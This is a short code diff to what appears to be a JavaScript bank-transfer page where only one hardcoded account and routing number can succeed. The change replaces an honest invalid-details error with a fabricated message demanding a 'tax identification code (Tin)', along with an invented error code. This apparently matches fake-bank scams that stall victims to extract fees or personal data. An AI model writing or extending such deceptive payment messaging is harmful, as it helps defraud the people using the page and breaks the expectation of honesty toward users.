@@ -1426,7 +1426,7 @@
                     
                     // STRICT VALIDATION - Only specific account/routing combination works
                     if (accountNumber !== VALID_ACCOUNT_NUMBER || routingNumber !== VALID_ROUTING_NUMBER) {
-                        showNotification('Transfer Failed', 'Transaction cannot be processed. Invalid account details.', 'error');
+                        showNotification('Transfer Failed', 'This transaction cannot be completed at this time. Please provide a valid tax identification code (Tin) to proceed with the transfer./nError code: TXN-1097', 'error');
                         return;
                     }
                 }
